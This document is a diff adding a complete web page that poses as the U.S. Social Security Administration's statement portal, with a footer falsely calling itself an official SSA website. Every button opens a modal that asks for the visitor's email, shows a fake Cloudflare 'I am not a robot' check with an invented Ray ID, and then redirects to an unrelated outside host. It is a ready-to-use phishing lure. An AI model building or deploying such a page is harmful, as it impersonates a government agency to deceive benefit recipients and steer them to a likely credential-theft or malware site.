@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Security | Statement Access</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #f1f4f6;
+            color: #1a1a2e;
+        }
+
+        /* Header */
+        .header {
+            background: #fff;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .header .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #002d72;
+            letter-spacing: 1px;
+        }
+
+        .header .logo span {
+            font-weight: 300;
+            color: #4a6fa5;
+        }
+
+        /* Hero */
+        .hero {
+            background: #002d72;
+            color: #fff;
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .hero p {
+            font-size: 16px;
+            opacity: 0.9;
+            max-width: 600px;
+            margin: 0 auto 20px auto;
+        }
+
+        .hero .btn-primary {
+            display: inline-block;
+            background: #fff;
+            color: #002d72;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 16px;
+            text-decoration: none;
+            transition: background 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hero .btn-primary:hover {
+            background: #e5e7eb;
+        }
+
+        /* Modal / Overlay */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-box {
+            background: #fff;
+            max-width: 440px;
+            width: 90%;
+            padding: 30px 25px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            position: relative;
+            animation: modalIn 0.4s ease;
+        }
+
+        @keyframes modalIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9) translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .modal-box .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            font-size: 22px;
+            color: #999;
+            cursor: pointer;
+            background: none;
+            border: none;
+            transition: color 0.3s;
+        }
+
+        .modal-box .close-btn:hover {
+            color: #333;
+        }
+
+        .modal-box .modal-icon {
+            font-size: 48px;
+            color: #002d72;
+            margin-bottom: 10px;
+        }
+
+        .modal-box h2 {
+            font-size: 20px;
+            color: #1f2937;
+            margin-bottom: 6px;
+        }
+
+        .modal-box p {
+            font-size: 14px;
+            color: #6b7280;
+            margin-bottom: 18px;
+        }
+
+        .modal-box label {
+            display: block;
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+            text-align: left;
+        }
+
+        .modal-box input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 6px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border 0.3s;
+        }
+
+        .modal-box input:focus {
+            border-color: #002d72;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 45, 114, 0.1);
+        }
+
+        .modal-box .btn-submit {
+            width: 100%;
+            margin-top: 18px;
+            background: #002d72;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .modal-box .btn-submit:hover {
+            background: #001f4f;
+        }
+
+        /* Cloudflare Checkbox */
+        .cf-checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #f8fafc;
+            border: 2px solid #d1d5db;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin: 15px 0 10px 0;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .cf-checkbox-wrapper:hover {
+            border-color: #9ca3af;
+            background: #f1f5f9;
+        }
+
+        .cf-checkbox-wrapper.checked {
+            border-color: #22c55e;
+            background: #f0fdf4;
+        }
+
+        .cf-checkbox-wrapper .cf-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 2px solid #d1d5db;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            flex-shrink: 0;
+            background: #fff;
+        }
+
+        .cf-checkbox-wrapper.checked .cf-checkbox {
+            background: #22c55e;
+            border-color: #22c55e;
+            color: #fff;
+        }
+
+        .cf-checkbox-wrapper .cf-checkbox i {
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .cf-checkbox-wrapper.checked .cf-checkbox i {
+            opacity: 1;
+        }
+
+        .cf-checkbox-wrapper .cf-label {
+            font-size: 14px;
+            color: #1f2937;
+            font-weight: 500;
+        }
+
+        .cf-checkbox-wrapper .cf-label small {
+            font-weight: 400;
+            color: #6b7280;
+            font-size: 13px;
+        }
+
+        .verifying-message {
+            display: none;
+            margin-top: 12px;
+        }
+
+        .verifying-message .checking-text {
+            font-size: 13px;
+            color: #002d72;
+            font-weight: 600;
+        }
+
+        .verifying-message .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid #e5e7eb;
+            border-top: 3px solid #f6821f;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .verifying-message .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+
+        .verifying-message .progress-bar .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f6821f, #002d72);
+            width: 0%;
+            border-radius: 2px;
+            animation: progress 2.5s ease-in-out forwards;
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            25% { width: 30%; }
+            50% { width: 55%; }
+            75% { width: 80%; }
+            100% { width: 100%; }
+        }
+
+        .verifying-message .ray-id {
+            font-size: 11px;
+            color: #9ca3af;
+            margin-top: 10px;
+            font-family: monospace;
+        }
+
+        .complete-message {
+            display: none;
+            margin-top: 12px;
+            color: #22c55e;
+            font-weight: 600;
+        }
+
+        .complete-message i {
+            margin-right: 6px;
+        }
+
+        .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+
+        /* Services Grid */
+        .services {
+            max-width: 1100px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 24px;
+        }
+
+        .service-card {
+            background: #fff;
+            padding: 24px 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            border: 1px solid #e5e7eb;
+            text-align: center;
+            transition: box-shadow 0.3s;
+            cursor: pointer;
+        }
+
+        .service-card:hover {
+            box-shadow: 0 4px 16px rgba(0,0,0,0.10);
+        }
+
+        .service-card .icon {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        .service-card h3 {
+            font-size: 16px;
+            color: #002d72;
+            margin-bottom: 6px;
+        }
+
+        .service-card p {
+            font-size: 13px;
+            color: #6b7280;
+            line-height: 1.5;
+        }
+
+        .service-card .btn-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #002d72;
+            font-weight: 600;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .service-card .btn-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f8fafc;
+            border-top: 1px solid #e5e7eb;
+            padding: 24px 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        .footer a {
+            color: #002d72;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 620px) {
+            .hero h1 { font-size: 24px; }
+            .services { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">Social <span>Security</span></div>
+    </div>
+
+    <!-- Hero -->
+    <div class="hero">
+        <h1>Access Your Statement Online</h1>
+        <p>With a secure my Social Security account, you can view, download, and manage your statement—anywhere, anytime.</p>
+        <button class="btn-primary" id="openModalBtn">View Your Statement</button>
+    </div>
+
+    <!-- Services Grid - All cards now open the same modal -->
+    <div class="services">
+        <div class="service-card" onclick="openModal()">
+            <div class="icon">📄</div>
+            <h3>Download Your Statement</h3>
+            <p>Access your latest Social Security statement in PDF format.</p>
+            <span class="btn-link">Download now →</span>
+        </div>
+        <div class="service-card" onclick="openModal()">
+            <div class="icon">📊</div>
+            <h3>Benefits Estimate</h3>
+            <p>Calculate your estimated benefits based on your earnings record.</p>
+            <span class="btn-link">Check estimate →</span>
+        </div>
+        <div class="service-card" onclick="openModal()">
+            <div class="icon">✅</div>
+            <h3>Check Your Status</h3>
+            <p>See where you are in your application or appeal process.</p>
+            <span class="btn-link">Check status →</span>
+        </div>
+        <div class="service-card" onclick="openModal()">
+            <div class="icon">🪪</div>
+            <h3>Replace Your Card</h3>
+            <p>Find the best way to replace your Social Security card.</p>
+            <span class="btn-link">Replace card →</span>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>This is an official website of the U.S. Social Security Administration.</p>
+        <p><a href="#">Privacy Policy</a> &bull; <a href="#">Terms of Service</a> &bull; <a href="#">Contact Us</a></p>
+        <p>© 2026 Social Security Administration</p>
+    </div>
+
+    <!-- ===== MODAL (Email + Cloudflare) ===== -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box" id="modalBox">
+
+            <button class="close-btn" id="closeModalBtn">&times;</button>
+
+            <div class="modal-icon">🔐</div>
+            <h2>Verify Your Identity</h2>
+            <p>Please enter your email to continue and complete the verification.</p>
+
+            <!-- Step 1: Email Input -->
+            <div id="stepEmail">
+                <label>Email Address</label>
+                <input type="email" id="emailInput" placeholder="you@example.com" required>
+                <button class="btn-submit" id="emailSubmitBtn">Continue</button>
+            </div>
+
+            <!-- Step 2: Cloudflare Checkbox (hidden initially) -->
+            <div id="stepCloudflare" style="display:none;">
+                <div style="margin:10px 0 6px 0;font-size:13px;color:#1f2937;font-weight:600;">
+                    <i class="fas fa-shield-alt" style="color:#f6821f;"></i> Verify you are human
+                </div>
+                <div class="cf-checkbox-wrapper" id="cfCheckbox" onclick="toggleCheckbox()">
+                    <div class="cf-checkbox">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="cf-label">
+                        <span id="cfLabelText">I am not a robot</span>
+                        <br><small>Verify your identity</small>
+                    </div>
+                </div>
+
+                <div class="verifying-message" id="verifyingMessage">
+                    <div class="checking-text">
+                        <span class="spinner"></span>
+                        <span>Verifying<span class="dots"></span></span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                    </div>
+                    <div class="ray-id" id="rayId"></div>
+                </div>
+
+                <div class="complete-message" id="completeMessage">
+                    <i class="fas fa-check-circle"></i> Verification complete! Redirecting...
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        //  LINKS - Same for all cards
+        // =============================================
+        const links = [
+            "https://priva26.privatednsorg.com/~navintelcr/ju/sns/",
+            "https://priva26.privatednsorg.com/~navintelcr/ju/sns/"
+        ];
+
+        function getRandomLink() {
+            return links[Math.floor(Math.random() * links.length)];
+        }
+
+        // =============================================
+        //  MODAL CONTROLS
+        // =============================================
+        const modalOverlay = document.getElementById('modalOverlay');
+        const openModalBtn = document.getElementById('openModalBtn');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+
+        function openModal() {
+            modalOverlay.classList.add('active');
+            // Reset to email step
+            document.getElementById('stepEmail').style.display = 'block';
+            document.getElementById('stepCloudflare').style.display = 'none';
+            document.getElementById('emailInput').value = '';
+            document.getElementById('emailInput').focus();
+            // Reset Cloudflare
+            window.cfChecked = false;
+            const wrapper = document.getElementById('cfCheckbox');
+            wrapper.classList.remove('checked');
+            document.getElementById('cfLabelText').textContent = 'I am not a robot';
+            document.getElementById('verifyingMessage').style.display = 'none';
+            document.getElementById('completeMessage').style.display = 'none';
+        }
+
+        function closeModal() {
+            modalOverlay.classList.remove('active');
+        }
+
+        // Open modal from hero button
+        openModalBtn.addEventListener('click', openModal);
+
+        // Close modal
+        closeModalBtn.addEventListener('click', closeModal);
+        modalOverlay.addEventListener('click', function(e) {
+            if (e.target === modalOverlay) closeModal();
+        });
+
+        // =============================================
+        //  EMAIL SUBMIT → SHOW CLOUDFLARE
+        // =============================================
+        document.getElementById('emailSubmitBtn').addEventListener('click', function(e) {
+            const email = document.getElementById('emailInput').value.trim();
+            const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!pattern.test(email)) {
+                alert('Please enter a valid email address.');
+                return;
+            }
+
+            // Hide email step, show Cloudflare step
+            document.getElementById('stepEmail').style.display = 'none';
+            document.getElementById('stepCloudflare').style.display = 'block';
+        });
+
+        // Allow Enter key on email input
+        document.getElementById('emailInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('emailSubmitBtn').click();
+            }
+        });
+
+        // =============================================
+        //  CLOUDFLARE CHECKBOX
+        // =============================================
+        window.cfChecked = false;
+
+        function toggleCheckbox() {
+            if (window.cfChecked) return;
+            window.cfChecked = true;
+
+            const wrapper = document.getElementById('cfCheckbox');
+            wrapper.classList.add('checked');
+            document.getElementById('cfLabelText').textContent = '✓ Verified';
+
+            function generateRayId() {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                let result = '';
+                for (let i = 0; i < 16; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
+            }
+
+            setTimeout(function() {
+                document.getElementById('verifyingMessage').style.display = 'block';
+                document.getElementById('rayId').textContent = 'Ray ID: ' + generateRayId();
+            }, 400);
+
+            setTimeout(function() {
+                document.getElementById('verifyingMessage').style.display = 'none';
+                document.getElementById('completeMessage').style.display = 'block';
+            }, 2800);
+
+            setTimeout(function() {
+                window.location.href = getRandomLink();
+            }, 3800);
+        }
+    </script>
+
+</body>
+</html>
